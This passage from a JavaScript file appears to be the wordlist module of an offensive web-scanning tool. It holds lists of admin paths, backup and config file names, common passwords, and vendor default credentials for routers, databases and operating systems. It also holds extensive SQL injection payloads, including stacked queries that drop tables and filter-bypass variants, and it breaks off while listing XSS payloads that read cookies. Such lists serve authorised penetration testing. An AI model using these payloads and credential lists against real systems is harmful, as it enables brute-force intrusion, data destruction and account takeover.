        'download', 'downloads', 'file', 'upload', 'media', 'gallery',
        'home', 'index', 'main', 'default', 'welcome', 'about', 'contact',
        'lib', 'library', 'libraries', 'vendor', 'vendors', 'third-party',
        'plugins', 'plugin', 'modules', 'module', 'components', 'component',
        'themes', 'theme', 'templates', 'template', 'layouts', 'layout',
        'includes', 'include', 'common', 'shared', 'utils', 'utilities',
        'scripts', 'script', 'style', 'styles', 'stylesheet', 'stylesheets',
        'fonts', 'font', 'icons', 'icon', 'graphics', 'resources',
        'data', 'database', 'db', 'sql', 'json', 'xml', 'csv',
        'export', 'import', 'sync', 'backup', 'restore', 'migrate',
        'tools', 'tool', 'admin-tools', 'utilities', 'helper', 'helpers',
        'reports', 'report', 'analytics', 'stats', 'statistics', 'metrics',
        'monitoring', 'monitor', 'health', 'status', 'ping', 'check',
        'mail', 'email', 'smtp', 'pop', 'imap', 'webmail', 'newsletter',
        'security', 'auth', 'authentication', 'authorization', 'oauth',
        'token', 'tokens', 'session', 'sessions', 'cookie', 'cookies',
        'ssl', 'tls', 'https', 'cert', 'certificate', 'certificates',
        'mobile', 'app', 'apps', 'application', 'applications', 'service',
        'services', 'worker', 'workers', 'job', 'jobs', 'queue', 'cron',
        'cdn', 'static', 'assets-cdn', 'media-cdn', 'img-cdn', 'js-cdn',
        'staging-api', 'dev-api', 'test-api', 'beta-api', 'alpha-api',
        'cms', 'content', 'pages', 'page', 'posts', 'post', 'articles',
        'editor', 'edit', 'create', 'new', 'add', 'delete', 'remove',
        'update', 'modify', 'change', 'save', 'submit', 'form', 'forms',
        'ajax', 'async', 'xhr', 'fetch', 'request', 'response', 'callback',
        'embed', 'widget', 'widgets', 'iframe', 'frame', 'popup', 'modal'
    ];
}

function getAdminPaths() {
    return [
        'admin.php', 'admin.html', 'admin.asp', 'admin.aspx',
        'administrator.php', 'administrator.html', 'administrator.asp',
        'login.php', 'login.html', 'login.asp', 'login.aspx',
        'cp.php', 'cp.html', 'controlpanel.php', 'control.php',
        'wp-admin/', 'wp-login.php', 'wp-admin.php',
        'admin/', 'admin/index.php', 'admin/login.php',
        'manager/', 'management/', 'adm/', 'admins/',
        'administrator/', 'moderator/', 'webadmin/',
        'adminarea/', 'bb-admin/', 'adminLogin/',
        'admin_area/', 'panel-administracion/', 'instadmin/',
        'memberadmin/', 'administratorlogin/', 'adm/',
        'admin/account.php', 'admin/index.html', 'admin/login.html',
        'admin/admin.html', 'admin_area/admin.html', 'admin_area/login.html',
        'siteadmin/', 'siteadmin/index.php', 'siteadmin/login.php'
    ];
}

function getBackupFiles() {
    return [
        'backup.zip', 'backup.tar.gz', 'backup.sql', 'backup.txt',
        'database.sql', 'db.sql', 'dump.sql', 'data.sql',
        'site.zip', 'website.zip', 'web.tar.gz', 'www.zip',
        'old.zip', 'archive.zip', 'files.zip', 'temp.zip',
        'backup.tar', 'backup.rar', 'backup.7z', 'backup.gz',
        'config.bak', 'config.old', 'config.backup', 'config.save',
        'settings.bak', 'settings.old', 'wp-config.php.bak',
        'database.backup', 'db.backup', 'mysql.backup',
        'copy.txt', 'orig.txt', 'original.txt', 'backup.php'
    ];
}

function getConfigFiles() {
    return [
        'config.php', 'config.inc.php', 'config.inc', 'configuration.php',
        'wp-config.php', 'wp-config.inc', 'settings.php', 'settings.inc',
        'database.php', 'db.php', 'connect.php', 'connection.php',
        'constants.php', 'defines.php', 'global.php', 'globals.php',
        'config.xml', 'config.json', 'config.ini', 'config.yaml',
        'settings.xml', 'settings.json', 'settings.ini', 'settings.yaml',
        'app.config', 'web.config', 'application.config', 'site.config',
        'config.txt', 'config.cfg', 'config.conf', 'configuration.txt',
        'env', '.env', '.env.local', '.env.production', '.env.development',
        'secrets', '.secrets', 'credentials', '.credentials'
    ];
}

function generateCommonPasswords() {
    return [
        // Most common passwords
        'password', '123456', '123456789', 'qwerty', 'abc123',
        'password1', 'admin', 'letmein', 'welcome', '1234567890',
        'Password', 'PASSWORD', 'password123', 'admin123', 'root',
        'toor', 'pass', 'test', 'guest', 'user', 'demo', 'sample',
        '12345', '1234567', '12345678', '123456789', '1234567890',
        
        // Keyboard patterns
        'qwerty123', 'asdfgh', 'zxcvbn', 'poiuyt', 'mnbvcx',
        'qwertyuiop', 'asdfghjkl', 'zxcvbnm', '1qaz2wsx', 'qazwsx',
        'qweasd', 'qweasdzxc', 'adgjmptw', '1q2w3e4r', '1q2w3e',
        
        // Popular names and words
        'dragon', 'monkey', 'football', 'baseball', 'soccer',
        'master', 'shadow', 'jordan', 'superman', 'batman',
        'trustno1', 'iloveyou', 'princess', 'rockyou', 'sunshine',
        'charlie', 'daniel', 'robert', 'jessica', 'matthew',
        'michael', 'jennifer', 'william', 'ashley', 'nicole',
        
        // Common variations
        'admin1234', 'password12', 'password1234', 'pass123',
        'test123', 'user123', 'guest123', 'demo123', 'temp123',
        'changeme', 'change', 'default', 'secret', 'private',
        'system', 'service', 'manager', 'operator', 'supervisor',
        
        // Date patterns
        '2024', '2023', '2022', '2021', '2020', '1234',
        '01012024', '12345678', '87654321', '11111111',
        '00000000', '12341234', '56785678', '90909090',
        
        // Special character patterns
        'password!', 'admin!', 'test!', '123456!', 'qwerty!',
        'password@', 'admin@', 'test@', '123456@', 'qwerty@',
        'password#', 'admin#', 'test#', '123456#', 'qwerty#',
        'password$', 'admin$', 'test$', '123456$', 'qwerty$',
        
        // Technology related
        'linux', 'windows', 'ubuntu', 'debian', 'centos',
        'mysql', 'oracle', 'postgres', 'mongodb', 'redis',
        'apache', 'nginx', 'tomcat', 'jetty', 'iis',
        'docker', 'kubernetes', 'jenkins', 'gitlab', 'github',
        
        // Company/brand names
        'cisco', 'netgear', 'linksys', 'dlink', 'tplink',
        'microsoft', 'google', 'amazon', 'facebook', 'twitter',
        'apple', 'samsung', 'huawei', 'xiaomi', 'nokia',
        
        // Security defaults
        'security', 'firewall', 'vpn', 'proxy', 'gateway',
        'router', 'switch', 'bridge', 'access', 'control',
        'monitor', 'backup', 'restore', 'update', 'patch',
        
        // Empty and simple
        '', ' ', 'a', 'aa', 'aaa', 'aaaa', 'aaaaa',
        '1', '11', '111', '1111', '11111', '111111',
        'x', 'xx', 'xxx', 'xxxx', 'xxxxx', 'xxxxxx'
    ];
}

function generateWebDirectories() {
    return [
        'admin', 'administrator', 'wp-admin', 'wp-content', 'wp-includes',
        'login', 'dashboard', 'panel', 'control', 'manage', 'manager',
        'assets', 'css', 'js', 'javascript', 'images', 'img', 'uploads',
        'files', 'documents', 'downloads', 'media', 'gallery', 'photos',
        'backup', 'backups', 'bak', 'old', 'archive', 'archives',
        'config', 'configuration', 'settings', 'setup', 'install',
        'test', 'testing', 'dev', 'development', 'staging', 'demo',
        'api', 'apis', 'v1', 'v2', 'rest', 'graphql', 'soap',
        'public', 'private', 'secure', 'protected', 'restricted',
        'temp', 'tmp', 'cache', 'logs', 'log', 'debug', 'error'
    ];
}

function generateCommonUsernames() {
    return [
        // Basic admin accounts
        'admin', 'administrator', 'root', 'user', 'guest', 'demo',
        'test', 'testuser', 'sample', 'example', 'default', 'sa',
        'sysadmin', 'system', 'operator', 'manager', 'service',
        'support', 'helpdesk', 'webmaster', 'postmaster', 'mail',
        
        // Web services
        'ftp', 'www', 'web', 'apache', 'nginx', 'httpd', 'www-data',
        'tomcat', 'jetty', 'iis', 'lighttpd', 'caddy', 'traefik',
        
        // Database users
        'mysql', 'postgres', 'postgresql', 'oracle', 'mssql', 'sqlserver',
        'db2', 'mongodb', 'mongo', 'redis', 'elastic', 'elasticsearch',
        'cassandra', 'neo4j', 'influxdb', 'mariadb', 'sqlite',
        
        // Development tools
        'jenkins', 'git', 'svn', 'gitlab', 'github', 'bitbucket',
        'docker', 'kubernetes', 'k8s', 'ansible', 'puppet', 'chef',
        'terraform', 'vagrant', 'bamboo', 'teamcity', 'travis',
        
        // Monitoring/Logging
        'backup', 'monitoring', 'nagios', 'zabbix', 'cacti', 'grafana',
        'kibana', 'splunk', 'elk', 'logstash', 'fluentd', 'prometheus',
        'alertmanager', 'sensu', 'icinga', 'pandora', 'observium',
        
        // Network services
        'network', 'radius', 'ldap', 'bind', 'dns', 'dhcp', 'ntp',
        'snmp', 'tftp', 'syslog', 'proxy', 'squid', 'haproxy',
        'nginx-proxy', 'reverse-proxy', 'load-balancer', 'firewall',
        
        // Cloud services
        'aws', 'azure', 'gcp', 'cloudflare', 'digitalocean', 'linode',
        'vultr', 'heroku', 'vercel', 'netlify', 'cloud', 'ec2',
        'lambda', 's3', 'rds', 'dynamo', 'cognito', 'iam',
        
        // Common first names
        'john', 'jane', 'admin1', 'admin2', 'user1', 'user2',
        'test1', 'test2', 'dev', 'developer', 'devops', 'ops',
        'security', 'sec', 'audit', 'auditor', 'compliance',
        
        // Service accounts
        'service-account', 'svc', 'app', 'application', 'api',
        'worker', 'daemon', 'cron', 'scheduler', 'queue',
        'batch', 'job', 'task', 'process', 'thread',
        
        // Special characters variations
        'admin_user', 'admin-user', 'admin.user', 'test_user',
        'test-user', 'test.user', 'guest_user', 'guest-user',
        'guest.user', 'demo_user', 'demo-user', 'demo.user',
        
        // Numbers
        'admin123', 'user123', 'test123', 'guest123', 'demo123',
        'user001', 'user002', 'user003', 'admin001', 'admin002',
        'test001', 'test002', 'guest001', 'guest002', 'demo001',
        
        // Organizational roles
        'ceo', 'cto', 'cio', 'cso', 'manager', 'director',
        'supervisor', 'lead', 'senior', 'junior', 'intern',
        'contractor', 'vendor', 'external', 'consultant',
        
        // Empty and minimal
        '', 'a', 'admin@', '@admin', '_admin', 'admin_',
        '-admin', 'admin-', '.admin', 'admin.'
    ];
}

function generateSubdomains() {
    return [
        // Standard web services
        'www', 'mail', 'ftp', 'admin', 'webmail', 'secure', 'vpn',
        'remote', 'blog', 'shop', 'store', 'forum', 'support',
        'help', 'docs', 'wiki', 'portal', 'gateway', 'proxy',
        
        // API services
        'api', 'rest', 'graphql', 'soap', 'ws', 'service',
        'api1', 'api2', 'api-v1', 'api-v2', 'v1', 'v2', 'v3',
        'services', 'microservice', 'webhook', 'callback',
        
        // Development environments
        'test', 'dev', 'staging', 'demo', 'beta', 'alpha',
        'sandbox', 'lab', 'playground', 'preview', 'canary',
        'development', 'testing', 'integration', 'uat', 'qa',
        
        // Mobile and apps
        'mobile', 'm', 'app', 'apps', 'ios', 'android',
        'application', 'client', 'webapp', 'web-app',
        
        // Content delivery
        'cdn', 'static', 'assets', 'media', 'images', 'img',
        'video', 'videos', 'audio', 'download', 'downloads',
        'files', 'backup', 'archive', 'storage', 'data',
        
        // Monitoring and status
        'monitoring', 'status', 'health', 'metrics', 'logs',
        'analytics', 'stats', 'dashboard', 'control',
        'console', 'panel', 'manage', 'management',
        
        // Email services
        'mail1', 'mail2', 'mail3', 'pop', 'imap', 'smtp',
        'exchange', 'outlook', 'webmail1', 'webmail2',
        'mx', 'mx1', 'mx2', 'mx3', 'autoconfig', 'autodiscover',
        
        // Database services
        'db', 'database', 'mysql', 'postgres', 'mongo',
        'redis', 'elastic', 'search', 'solr', 'sphinx',
        'db1', 'db2', 'master', 'slave', 'replica',
        
        // Security services
        'auth', 'login', 'sso', 'oauth', 'saml', 'ldap',
        'identity', 'iam', 'security', 'firewall', 'waf',
        'ssl', 'cert', 'ca', 'pki', 'vpn1', 'vpn2',
        
        // Infrastructure
        'lb', 'load-balancer', 'proxy1', 'proxy2', 'cache',
        'memcache', 'memcached', 'varnish', 'haproxy',
        'nginx', 'apache', 'web1', 'web2', 'web3',
        
        // CI/CD and DevOps
        'ci', 'cd', 'jenkins', 'gitlab', 'github', 'git',
        'build', 'deploy', 'release', 'docker', 'k8s',
        'kubernetes', 'rancher', 'nomad', 'consul',
        
        // Cloud services
        'aws', 'azure', 'gcp', 'cloud', 'compute',
        's3', 'ec2', 'lambda', 'functions', 'serverless',
        
        // Commerce and business
        'shop1', 'shop2', 'cart', 'checkout', 'payment',
        'pay', 'billing', 'invoice', 'order', 'orders',
        'catalog', 'product', 'products', 'inventory',
        
        // Communication
        'chat', 'messenger', 'slack', 'teams', 'zoom',
        'meet', 'conference', 'video', 'voice', 'sip',
        'pbx', 'voip', 'asterisk', 'freeswitch',
        
        // Social and community
        'social', 'community', 'facebook', 'twitter',
        'linkedin', 'instagram', 'youtube', 'reddit',
        'discord', 'telegram', 'whatsapp',
        
        // Regional/Geographic
        'us', 'eu', 'asia', 'na', 'emea', 'apac',
        'east', 'west', 'north', 'south', 'global',
        'local', 'regional', 'country', 'city',
        
        // Numbers and variations
        '1', '2', '3', '01', '02', '03', 'a', 'b', 'c',
        'prod', 'production', 'live', 'public', 'private',
        'internal', 'external', 'partner', 'vendor',
        
        // Special purposes
        'backup1', 'backup2', 'mirror', 'failover',
        'disaster', 'dr', 'redundant', 'cluster',
        'node1', 'node2', 'server1', 'server2',
        
        // Legacy and old
        'old', 'legacy', 'archive1', 'archive2',
        'historical', 'deprecated', 'sunset',
        'maintenance', 'temp', 'temporary'
    ];
}

function getNumericPatterns(min, max) {
    const patterns = [];
    for (let i = min; i <= max; i++) {
        patterns.push('1'.repeat(i));
        patterns.push('0'.repeat(i));
        patterns.push('123456789'.substring(0, i));
        patterns.push('987654321'.substring(0, i));
    }
    return patterns;
}

function getKeyboardPatterns() {
    return [
        'qwerty', 'qwertyuiop', 'asdfgh', 'asdfghjkl', 'zxcvbn', 'zxcvbnm',
        'qwertz', 'azerty', '123qwe', 'qwe123', 'asd123', '123asd',
        'qweasd', 'qweasdzxc', 'adgjmptw', 'aeiou', 'bcdfg'
    ];
}

function generateDatePatterns() {
    const patterns = [];
    const currentYear = new Date().getFullYear();
    
    for (let year = 1980; year <= currentYear; year++) {
        patterns.push(year.toString());
        patterns.push(year.toString().slice(-2));
    }
    
    for (let month = 1; month <= 12; month++) {
        patterns.push(month.toString().padStart(2, '0'));
        patterns.push(month.toString());
    }
    
    for (let day = 1; day <= 31; day++) {
        patterns.push(day.toString().padStart(2, '0'));
    }
    
    return patterns;
}

function generateCharacterCombinations(config) {
    const combinations = [];
    let charset = '';
    
    if (config.lowercase) charset += 'abcdefghijklmnopqrstuvwxyz';
    if (config.uppercase) charset += 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
    if (config.numbers) charset += '0123456789';
    if (config.special) charset += '!@#$%^&*()_+-=[]{}|;:,.<>?';
    
    // Generate limited combinations to avoid memory issues
    for (let i = 0; i < 1000; i++) {
        let combination = '';
        const length = Math.floor(Math.random() * (config.maxLength - config.minLength + 1)) + config.minLength;
        
        for (let j = 0; j < length; j++) {
            combination += charset[Math.floor(Math.random() * charset.length)];
        }
        
        combinations.push(combination);
    }
    
    return combinations;
}

function getRouterCredentials() {
    return [
        // Generic router defaults
        { username: 'admin', password: 'admin', vendor: 'generic' },
        { username: 'admin', password: 'password', vendor: 'generic' },
        { username: 'admin', password: '1234', vendor: 'generic' },
        { username: 'admin', password: '', vendor: 'generic' },
        { username: 'root', password: 'root', vendor: 'generic' },
        { username: 'administrator', password: 'administrator', vendor: 'generic' },
        { username: 'guest', password: 'guest', vendor: 'generic' },
        { username: 'user', password: 'user', vendor: 'generic' },
        { username: 'admin', password: '12345', vendor: 'generic' },
        { username: 'admin', password: '123456', vendor: 'generic' },
        
        // Cisco
        { username: 'admin', password: 'cisco', vendor: 'cisco' },
        { username: 'cisco', password: 'cisco', vendor: 'cisco' },
        { username: 'enable', password: 'cisco', vendor: 'cisco' },
        { username: 'admin', password: 'admin', vendor: 'cisco' },
        { username: 'root', password: 'cisco', vendor: 'cisco' },
        { username: 'cisco', password: 'admin', vendor: 'cisco' },
        { username: 'admin', password: '', vendor: 'cisco' },
        { username: 'cisco', password: '', vendor: 'cisco' },
        
        // Netgear
        { username: 'admin', password: 'netgear1', vendor: 'netgear' },
        { username: 'admin', password: 'password', vendor: 'netgear' },
        { username: 'admin', password: 'admin', vendor: 'netgear' },
        { username: 'admin', password: '1234', vendor: 'netgear' },
        { username: 'admin', password: '', vendor: 'netgear' },
        { username: 'netgear', password: 'netgear', vendor: 'netgear' },
        
        // Linksys
        { username: 'admin', password: 'admin', vendor: 'linksys' },
        { username: 'admin', password: '', vendor: 'linksys' },
        { username: 'admin', password: 'linksys', vendor: 'linksys' },
        { username: 'linksys', password: 'linksys', vendor: 'linksys' },
        { username: 'admin', password: 'password', vendor: 'linksys' },
        { username: 'root', password: 'admin', vendor: 'linksys' },
        
        // D-Link
        { username: 'admin', password: '', vendor: 'dlink' },
        { username: 'admin', password: 'admin', vendor: 'dlink' },
        { username: 'admin', password: 'password', vendor: 'dlink' },
        { username: 'user', password: '', vendor: 'dlink' },
        { username: 'admin', password: 'dlink', vendor: 'dlink' },
        
        // TP-Link
        { username: 'admin', password: 'admin', vendor: 'tplink' },
        { username: 'admin', password: '', vendor: 'tplink' },
        { username: 'admin', password: 'password', vendor: 'tplink' },
        { username: 'admin', password: 'tplink', vendor: 'tplink' },
        { username: 'user', password: 'user', vendor: 'tplink' },
        
        // Asus
        { username: 'admin', password: 'admin', vendor: 'asus' },
        { username: 'admin', password: '', vendor: 'asus' },
        { username: 'admin', password: 'password', vendor: 'asus' },
        { username: 'admin', password: 'asus', vendor: 'asus' },
        { username: 'root', password: 'root', vendor: 'asus' },
        
        // Belkin
        { username: 'admin', password: '', vendor: 'belkin' },
        { username: 'admin', password: 'admin', vendor: 'belkin' },
        { username: 'admin', password: 'belkin', vendor: 'belkin' },
        { username: '', password: 'admin', vendor: 'belkin' },
        
        // SMC
        { username: 'admin', password: 'smcadmin', vendor: 'smc' },
        { username: 'admin', password: 'epicrouter', vendor: 'smc' },
        { username: 'admin', password: 'admin', vendor: 'smc' },
        { username: 'smc', password: 'smc', vendor: 'smc' },
        
        // 3Com
        { username: 'admin', password: 'admin', vendor: '3com' },
        { username: 'admin', password: '', vendor: '3com' },
        { username: 'admin', password: 'comcomcom', vendor: '3com' },
        { username: 'read', password: 'synnet', vendor: '3com' },
        
        // Huawei
        { username: 'admin', password: 'admin', vendor: 'huawei' },
        { username: 'admin', password: '', vendor: 'huawei' },
        { username: 'root', password: 'admin', vendor: 'huawei' },
        { username: 'admin', password: 'huawei', vendor: 'huawei' },
        
        // ZTE
        { username: 'admin', password: 'admin', vendor: 'zte' },
        { username: 'admin', password: '', vendor: 'zte' },
        { username: 'user', password: 'user', vendor: 'zte' },
        { username: 'admin', password: 'zte', vendor: 'zte' },
        
        // Mikrotik
        { username: 'admin', password: '', vendor: 'mikrotik' },
        { username: 'admin', password: 'admin', vendor: 'mikrotik' },
        { username: 'admin', password: 'mikrotik', vendor: 'mikrotik' },
        
        // Ubiquiti
        { username: 'ubnt', password: 'ubnt', vendor: 'ubiquiti' },
        { username: 'admin', password: 'admin', vendor: 'ubiquiti' },
        { username: 'root', password: 'ubnt', vendor: 'ubiquiti' },
        
        // Additional manufacturers
        { username: 'admin', password: 'motorola', vendor: 'motorola' },
        { username: 'admin', password: 'netopia', vendor: 'netopia' },
        { username: 'admin', password: 'speedstream', vendor: 'speedstream' },
        { username: 'admin', password: 'westell', vendor: 'westell' },
        { username: 'admin', password: 'actiontec', vendor: 'actiontec' }
    ];
}

function getDatabaseCredentials() {
    return [
        { username: 'root', password: '', vendor: 'mysql' },
        { username: 'root', password: 'root', vendor: 'mysql' },
        { username: 'root', password: 'password', vendor: 'mysql' },
        { username: 'root', password: 'mysql', vendor: 'mysql' },
        { username: 'mysql', password: 'mysql', vendor: 'mysql' },
        { username: 'admin', password: 'admin', vendor: 'mysql' },
        { username: 'sa', password: '', vendor: 'mssql' },
        { username: 'sa', password: 'sa', vendor: 'mssql' },
        { username: 'sa', password: 'password', vendor: 'mssql' },
        { username: 'postgres', password: '', vendor: 'postgresql' },
        { username: 'postgres', password: 'postgres', vendor: 'postgresql' },
        { username: 'postgres', password: 'password', vendor: 'postgresql' },
        { username: 'oracle', password: 'oracle', vendor: 'oracle' },
        { username: 'system', password: 'oracle', vendor: 'oracle' },
        { username: 'sys', password: 'oracle', vendor: 'oracle' }
    ];
}

function getWebCredentials() {
    return [
        { username: 'admin', password: 'admin', vendor: 'generic' },
        { username: 'admin', password: 'password', vendor: 'generic' },
        { username: 'admin', password: '123456', vendor: 'generic' },
        { username: 'administrator', password: 'administrator', vendor: 'generic' },
        { username: 'root', password: 'root', vendor: 'generic' },
        { username: 'admin', password: 'changeme', vendor: 'generic' },
        { username: 'admin', password: 'letmein', vendor: 'generic' },
        { username: 'guest', password: 'guest', vendor: 'generic' },
        { username: 'user', password: 'user', vendor: 'generic' },
        { username: 'demo', password: 'demo', vendor: 'generic' },
        { username: 'test', password: 'test', vendor: 'generic' }
    ];
}

function getOSCredentials() {
    return [
        { username: 'administrator', password: 'administrator', vendor: 'windows' },
        { username: 'administrator', password: 'admin', vendor: 'windows' },
        { username: 'administrator', password: 'password', vendor: 'windows' },
        { username: 'administrator', password: '123456', vendor: 'windows' },
        { username: 'admin', password: 'admin', vendor: 'windows' },
        { username: 'guest', password: '', vendor: 'windows' },
        { username: 'root', password: 'root', vendor: 'linux' },
        { username: 'root', password: 'password', vendor: 'linux' },
        { username: 'root', password: 'toor', vendor: 'linux' },
        { username: 'root', password: '123456', vendor: 'linux' },
        { username: 'admin', password: 'admin', vendor: 'linux' },
        { username: 'user', password: 'user', vendor: 'linux' }
    ];
}

function getRESTEndpoints() {
    return [
        '/api', '/api/v1', '/api/v2', '/api/v3', '/rest', '/rest/v1',
        '/api/users', '/api/user', '/api/admin', '/api/login', '/api/auth',
        '/api/token', '/api/tokens', '/api/session', '/api/sessions',
        '/api/data', '/api/info', '/api/config', '/api/settings',
        '/api/status', '/api/health', '/api/ping', '/api/version',
        '/api/upload', '/api/download', '/api/files', '/api/documents',
        '/api/search', '/api/query', '/api/filter', '/api/sort',
        '/api/create', '/api/update', '/api/delete', '/api/get',
        '/api/post', '/api/put', '/api/patch', '/api/options',
        '/api/head', '/api/trace', '/api/connect'
    ];
}

function getGraphQLEndpoints() {
    return [
        '/graphql', '/graphql/v1', '/graphql/v2', '/api/graphql',
        '/gql', '/query', '/queries', '/mutation', '/mutations',
        '/subscription', '/subscriptions', '/schema', '/schemas',
        '/graphiql', '/graphql-playground', '/apollo', '/relay'
    ];
}

function getSOAPEndpoints() {
    return [
        '/soap', '/soap/v1', '/soap/v2', '/api/soap', '/webservice',
        '/webservices', '/service', '/services', '/wsdl', '/svc',
        '/asmx', '/asmx/service', '/axis', '/axis2', '/cxf'
    ];
}

function getWebhookEndpoints() {
    return [
        '/webhook', '/webhooks', '/hook', '/hooks', '/callback',
        '/callbacks', '/notify', '/notification', '/notifications',
        '/trigger', '/triggers', '/event', '/events', '/listener',
        '/listeners', '/handler', '/handlers', '/receiver', '/receivers'
    ];
}

function getWordPressPaths() {
    return [
        '/wp-admin/', '/wp-content/', '/wp-includes/', '/wp-login.php',
        '/wp-config.php', '/wp-admin/admin.php', '/wp-admin/index.php',
        '/wp-content/themes/', '/wp-content/plugins/', '/wp-content/uploads/',
        '/wp-includes/js/', '/wp-includes/css/', '/wp-includes/images/',
        '/xmlrpc.php', '/wp-cron.php', '/wp-mail.php', '/wp-settings.php',
        '/wp-blog-header.php', '/wp-comments-post.php', '/wp-trackback.php',
        '/wp-content/debug.log', '/wp-admin/install.php', '/wp-admin/setup-config.php'
    ];
}

function getDrupalPaths() {
    return [
        '/admin/', '/user/', '/node/', '/sites/', '/modules/', '/themes/',
        '/includes/', '/misc/', '/profiles/', '/scripts/', '/install.php',
        '/update.php', '/cron.php', '/xmlrpc.php', '/authorize.php',
        '/sites/default/', '/sites/all/', '/sites/default/files/',
        '/sites/default/settings.php', '/sites/default/default.settings.php'
    ];
}

function getJoomlaPaths() {
    return [
        '/administrator/', '/components/', '/modules/', '/plugins/',
        '/templates/', '/media/', '/cache/', '/logs/', '/tmp/',
        '/configuration.php', '/htaccess.txt', '/web.config.txt',
        '/README.txt', '/LICENSE.txt', '/index.php', '/robots.txt'
    ];
}

function getMagentoPaths() {
    return [
        '/admin/', '/downloader/', '/app/', '/skin/', '/js/', '/media/',
        '/var/', '/lib/', '/shell/', '/api.php', '/cron.php', '/index.php',
        '/app/etc/', '/app/code/', '/app/design/', '/var/log/', '/var/cache/'
    ];
}

function getApachePaths() {
    return [
        '/server-status', '/server-info', '/apache', '/apache2',
        '/httpd', '/cgi-bin/', '/icons/', '/manual/', '/phpmyadmin/',
        '/phpinfo.php', '/test.php', '/info.php', '/php.php'
    ];
}

function getNginxPaths() {
    return [
        '/nginx', '/nginx_status', '/status', '/basic_status',
        '/stub_status', '/health', '/ping', '/metrics'
    ];
}

function getTomcatPaths() {
    return [
        '/manager/', '/manager/html', '/manager/text', '/manager/status',
        '/host-manager/', '/examples/', '/docs/', '/admin/', '/axis/',
        '/axis2/', '/servlet/', '/struts/', '/spring/', '/webdav/'
    ];
}

function getIISPaths() {
    return [
        '/iisadmin/', '/iishelp/', '/iissamples/', '/msadc/', '/scripts/',
        '/certsrv/', '/printers/', '/aspnet_client/', '/exchange/',
        '/exchweb/', '/owa/', '/public/', '/rpc/', '/rpcwithcert/'
    ];
}

function getSQLInjectionPayloads(config) {
    const payloads = [];
    
    if (config.basic) {
        payloads.push(
            // Basic injection attempts
            "'", "''", "' OR '1'='1", "' OR 1=1--", "' OR 1=1#",
            "' OR 1=1/*", "admin'--", "admin'#", "admin'/*",
            "' OR 'x'='x", "' OR 'a'='a", "' UNION SELECT 1--",
            "1' OR '1'='1", "1' OR 1=1--", "1' OR 1=1#",
            
            // Double quote variations
            '"', '""', '" OR "1"="1', '" OR 1=1--', '" OR 1=1#',
            '" OR "x"="x', '" OR "a"="a', 'admin"--', 'admin"#',
            
            // Numeric injections
            '1 OR 1=1', '1 OR 1=1--', '1 OR 1=1#', '1 OR 1=1/*',
            '1) OR (1=1', '1) OR (1=1--', '1) OR (1=1#',
            
            // Boolean-based
            "' OR 't'='t", "' OR 'test'='test", "' OR 1=1 AND 'a'='a",
            "' OR 1=1 AND 'test'='test", "' OR 1=1 LIMIT 1--"
        );
    }
    
    if (config.advanced) {
        payloads.push(
            // UNION-based injections
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT 1,2,3--",
            "' UNION SELECT user(),database(),version()--",
            "' UNION SELECT table_name FROM information_schema.tables--",
            "' UNION SELECT column_name FROM information_schema.columns--",
            "' UNION SELECT schema_name FROM information_schema.schemata--",
            "' UNION SELECT table_name,column_name FROM information_schema.columns--",
            
            // Time-based blind
            "'; WAITFOR DELAY '00:00:05'--",
            "'; SELECT SLEEP(5)--",
            "' AND (SELECT SLEEP(5))--",
            "' OR (SELECT SLEEP(5))--",
            "'; pg_sleep(5)--",
            
            // Error-based
            "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
            "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)--",
            
            // Stacked queries
            "'; DROP TABLE users--",
            "'; INSERT INTO users VALUES(1,'admin','admin')--",
            "'; UPDATE users SET password='admin' WHERE id=1--",
            "'; CREATE TABLE test (id INT)--",
            "'; ALTER TABLE users ADD COLUMN test VARCHAR(255)--",
            
            // Database-specific functions
            "' UNION SELECT @@version,@@hostname,@@datadir--",
            "' UNION SELECT current_user(),current_database(),inet_server_addr()--",
            "' UNION SELECT sqlite_version(),1,1--",
            "' UNION SELECT banner FROM v$version--"
        );
    }
    
    if (config.bypass) {
        payloads.push(
            // Comment variations
            "' /**/OR/**/1=1--", "' %2F%2A%2A%2FOR%2F%2A%2A%2F1=1--",
            "' /*!50000OR*/ 1=1--", "' /*!50000UNION*/ /*!50000SELECT*/ 1--",
            
            // Logical operators
            "' ||'1'='1", "' &&'1'='1", "' |'1'='1", "' &'1'='1",
            "' OR '1'='1' ||'", "' AND '1'='1' &&'",
            
            // Case variations
            "' Or 1=1--", "' oR 1=1--", "' OR 1=1--", "' or 1=1--",
            "' UnIoN SeLeCt 1--", "' uNiOn SeLeCt 1--",
            
            // Whitespace bypass
            "' OR(1)=(1)--", "' OR/**/1=1--", "' OR\t1=1--", "' OR\n1=1--",
            "' OR\r1=1--", "' OR\r\n1=1--", "'/**/OR/**/1=1--",
            
            // Function-based bypass
            "' OR ASCII(SUBSTRING('a',1,1))=97--",
            "' OR CHAR(65)=CHAR(65)--", "' OR 'a'=CHAR(97)--",
            
            // Concatenation bypass
            "' OR 'a'||'b'='ab'--", "' OR CONCAT('a','b')='ab'--",
            "' OR 'a'+'b'='ab'--"
        );
    }
    
    if (config.encoded) {
        payloads.push(
            // URL encoding
            "%27", "%22", "%27%20OR%201=1--", "%27%20OR%20%271%27=%271",
            "%27%20UNION%20SELECT%201--", "%27%20OR%20%27a%27=%27a",
            
            // Double URL encoding
            "%2527", "%2522", "%252527", "%25252527",
            "%2527%2520OR%25201=1--", "%2527%2520UNION%2520SELECT%25201--",
            
            // Unicode encoding
            "%u0027", "%u0022", "%u0027%u0020OR%u00201=1--",
            "%u0027%u0020UNION%u0020SELECT%u00201--",
            
            // HTML entity encoding
            "&#39;", "&#34;", "&#39; OR 1=1--", "&#39; UNION SELECT 1--",
            "&apos;", "&quot;", "&apos; OR 1=1--",
            
            // Hex encoding
            "0x27", "0x22", "0x27204f5220313d312d2d",
            "CHAR(39)", "CHAR(34)", "CHAR(39,32,79,82,32,49,61,49)"
        );
    }
    
    return payloads;
}

function getXSSPayloads(config) {
    const payloads = [];
    
    if (config.basic) {
        payloads.push(
            "<script>alert('XSS')</script>",
            "<script>alert(1)</script>",
            "<script>alert(document.cookie)</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
